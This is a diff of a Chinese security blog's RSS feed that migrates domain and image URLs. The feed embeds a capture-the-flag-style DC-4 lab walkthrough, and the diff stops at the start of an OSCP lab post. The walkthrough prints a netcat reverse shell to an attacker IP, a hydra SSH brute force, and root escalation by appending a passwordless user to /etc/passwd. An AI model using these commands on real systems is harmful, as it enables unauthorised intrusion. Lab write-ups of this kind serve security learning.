@@ -3,8 +3,8 @@
     <channel>
         <title>Kirakira!</title>
         <subtitle>૮(˶ᵔ ᵕ ᵔ˶)ა</subtitle>
-        <icon>http://k1nako.github.io/images/favicon.ico</icon>
-        <link>http://K1nako.github.io</link>
+        <icon>http://k1nakoo.github.io/images/favicon.ico</icon>
+        <link>http://k1nakoo.github.io</link>
         <author>
           <name>K1nako</name>
         </author>
@@ -15,11 +15,11 @@
         <category term="关键词1" />
         <category term="关键词2" />
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/DC-4%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/DC-4%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
             <title>DC-4 渗透测试</title>
-            <link>http://k1nako.github.io/DC-4%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
-            <category term="靶场" scheme="http://k1nako.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
-            <category term="靶场复现" scheme="http://k1nako.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
+            <link>http://k1nakoo.github.io/DC-4%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+            <category term="靶场" scheme="http://k1nakoo.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
+            <category term="靶场复现" scheme="http://k1nakoo.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
             <pubDate>Mon, 25 Dec 2023 18:53:00 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;DC 靶场系列&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -42,31 +42,31 @@
 &lt;h4 id=&#34;探测目标ip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测目标ip&#34;&gt;#&lt;/a&gt; 探测目标 ip&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;arp-scan&lt;/strong&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;探测出靶机的具体 ip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225190109185.png&#34; alt=&#34;image-20231225190109185&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225190109185.png&#34; alt=&#34;image-20231225190109185&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;发现多余的 ip，扫一下端口开放&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;nmap&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; -p- &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.222.129&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225190419157.png&#34; alt=&#34;image-20231225190419157&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; -p- &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.222.129&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225190419157.png&#34; alt=&#34;image-20231225190419157&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;开放 &lt;code&gt;22&lt;/code&gt;   &lt;code&gt;80&lt;/code&gt;  两个端口&lt;/p&gt;
 &lt;p&gt;对 80 端口进行探查&lt;/p&gt;
 &lt;h4 id=&#34;爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆破&#34;&gt;#&lt;/a&gt; 爆破&lt;/h4&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225190921540.png&#34; alt=&#34;image-20231225190921540&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225190921540.png&#34; alt=&#34;image-20231225190921540&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;进入到网页，只有赤裸裸的登陆框&lt;/p&gt;
 &lt;p&gt;这里我的思路是 查看源代码 (什么都没有) &amp;gt; 扫目录 (dirsearch/dirb 扫，什么都没有) &amp;gt; 弱口令 (什么都没有) &amp;gt; 爆破&lt;/p&gt;
 &lt;p&gt;这里只写成功过程，随便丢个字典爆破&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225195059029.png&#34; alt=&#34;image-20231225195059029&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225195059029.png&#34; alt=&#34;image-20231225195059029&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;看了其他大佬的文章说是正确密码：&lt;strong&gt;happy&lt;/strong&gt;  我也不太确定，我这里估计是密码对了一次然后有 cookie 值，直接一路畅通&lt;/p&gt;
 &lt;h4 id=&#34;rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h4&gt;
 &lt;p&gt;登陆后发现很明显是个命令执行的按钮&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225202231659.png&#34; alt=&#34;image-20231225202231659&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225202231659.png&#34; alt=&#34;image-20231225202231659&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;bp！启动！&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;+ 替代空格&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225202745133.png&#34; alt=&#34;image-20231225202745133&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225202745133.png&#34; alt=&#34;image-20231225202745133&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;既然都能命令执行了，这肯定得弹个 shell&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#攻击机上监听&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#目标机上弹 shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; /bin/bash &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.222.128 &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225203132942.png&#34; alt=&#34;image-20231225203132942&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225203331461.png&#34; alt=&#34;image-20231225203331461&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#攻击机上监听&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#目标机上弹 shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; /bin/bash &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.222.128 &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225203132942.png&#34; alt=&#34;image-20231225203132942&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225203331461.png&#34; alt=&#34;image-20231225203331461&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;查看攻击机，发现已经成功了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225203405983.png&#34; alt=&#34;image-20231225203405983&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225203405983.png&#34; alt=&#34;image-20231225203405983&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里我们利用 python 的交互式，避免反复弹 shell&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;思路：先查看有哪些 suid 权限的二进制文件&lt;/p&gt;
 &lt;blockquote&gt;
@@ -76,9 +76,9 @@
 &lt;p&gt;没见到有熟悉的可利用文件&lt;/p&gt;
 &lt;h4 id=&#34;再爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#再爆破&#34;&gt;#&lt;/a&gt; 再爆破&lt;/h4&gt;
 &lt;p&gt;翻翻根目录，翻翻 home 文件，发现有三个用户名的文件夹，估计就是突破点了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225204250336.png&#34; alt=&#34;image-20231225204250336&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225204250336.png&#34; alt=&#34;image-20231225204250336&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;一个个看下去只有 &lt;code&gt;jim&lt;/code&gt;  有东西，估计是没权限查看，有个.sh 的文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225204500087.png&#34; alt=&#34;image-20231225204500087&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225204500087.png&#34; alt=&#34;image-20231225204500087&#34; /&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;But I&#39;d rather &lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; my &lt;span class=&#34;token function&#34;&gt;head&lt;/span&gt; against a brick wall&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;但我宁愿用头撞墙     &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;机翻&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里提示要爆破，之前探测端口开放了 &lt;code&gt;ssh&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;而且在 &lt;code&gt;/home/jim/backups&lt;/code&gt;  目录下有个字典&lt;/p&gt;
 &lt;p&gt;扒下来爆破 (复制粘贴&lt;/p&gt;
@@ -86,25 +86,25 @@
 &lt;blockquote&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1d2VpbGl5aS9hcnRpY2xlL2RldGFpbHMvMTA1NTIzODIz&#34;&gt;破解工具 Hydra 使用详解&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hydra &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; jim &lt;span class=&#34;token parameter variable&#34;&gt;-P&lt;/span&gt; 你的字典路径 &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.222.129 &lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-V&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-V&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#显示过程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#线程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#指定用户名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-P&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#指定字典&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225210921914.png&#34; alt=&#34;image-20231225210921914&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hydra &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; jim &lt;span class=&#34;token parameter variable&#34;&gt;-P&lt;/span&gt; 你的字典路径 &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.222.129 &lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-V&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-V&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#显示过程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#线程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#指定用户名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;-P&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#指定字典&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225210921914.png&#34; alt=&#34;image-20231225210921914&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;爆出来后 &lt;code&gt;ssh&lt;/code&gt;  连接&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; jim@192.168.222.129&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225211110292.png&#34; alt=&#34;image-20231225211110292&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; jim@192.168.222.129&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225211110292.png&#34; alt=&#34;image-20231225211110292&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;连接成功后这里有个提示，有一份邮件&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;find / -name &#39;mail&#39;&lt;/code&gt;  利用 find 大概搜索一下，发现 &lt;code&gt;/var&lt;/code&gt;  目录下有一个 &lt;code&gt;mail&lt;/code&gt;  文件夹&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225211354390.png&#34; alt=&#34;image-20231225211354390&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225211354390.png&#34; alt=&#34;image-20231225211354390&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;得到 &lt;code&gt;charles&lt;/code&gt;  用户的密码&lt;/p&gt;
 &lt;p&gt;速度登陆 &lt;code&gt;su charles&lt;/code&gt;&lt;/p&gt;
 &lt;h4 id=&#34;提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#提权&#34;&gt;#&lt;/a&gt; 提权&lt;/h4&gt;
 &lt;p&gt;登陆成功探索一番后什么也没发现&lt;/p&gt;
 &lt;p&gt;看大佬文章发现需要利用 &lt;code&gt;sudo -l&lt;/code&gt;  查看用户的权限&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225211654462.png&#34; alt=&#34;image-20231225211654462&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225211654462.png&#34; alt=&#34;image-20231225211654462&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;该用户可以以 &lt;code&gt;root&lt;/code&gt;  权限免密码执行 &lt;code&gt;/usr/bin/teehee&lt;/code&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemxneHpzd2p5L3AvMTYxMTg0NjguaHRtbA==&#34;&gt;teehee 提权&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;它可以在文件末尾追加数据，但是并不会覆盖原来文件&lt;/p&gt;
 &lt;p&gt;所以我们可以利用这个权限添加一个新用户到 &lt;code&gt;/etc/passwd&lt;/code&gt;  文件里&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;admin::0:0:::/bin/bash&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; teehee &lt;span class=&#34;token parameter variable&#34;&gt;-a&lt;/span&gt; /etc/passwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20231225212814891.png&#34; alt=&#34;image-20231225212814891&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;admin::0:0:::/bin/bash&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; teehee &lt;span class=&#34;token parameter variable&#34;&gt;-a&lt;/span&gt; /etc/passwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20231225212814891.png&#34; alt=&#34;image-20231225212814891&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;越权成功，flag 在 &lt;code&gt;/root&lt;/code&gt;  里&lt;/p&gt;
 &lt;h2 id=&#34;三-知识总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-知识总结&#34;&gt;#&lt;/a&gt; 三、知识总结&lt;/h2&gt;
 &lt;h4 id=&#34;netcat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netcat&#34;&gt;#&lt;/a&gt; netcat&lt;/h4&gt;
@@ -115,11 +115,11 @@
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;admin::0:0:::/bin/bash&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; teehee &lt;span class=&#34;token parameter variable&#34;&gt;-a&lt;/span&gt; /etc/passwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/OSCP%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/OSCP%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
             <title>OSCP 靶场渗透测试</title>
-            <link>http://k1nako.github.io/OSCP%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
-            <category term="靶场" scheme="http://k1nako.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
-            <category term="靶场复现" scheme="http://k1nako.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
+            <link>http://k1nakoo.github.io/OSCP%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+            <category term="靶场" scheme="http://k1nakoo.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
+            <category term="靶场复现" scheme="http://k1nakoo.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
             <pubDate>Thu, 22 Jun 2023 14:05:33 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;适合新手做的靶场&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -146,48 +146,48 @@
 &lt;pre&gt;&lt;code&gt;arp-scan -l
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;探测出靶机 ip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622133718432.png&#34; alt=&#34;image-20230622133718432&#34; /&gt;&lt;/p&gt;
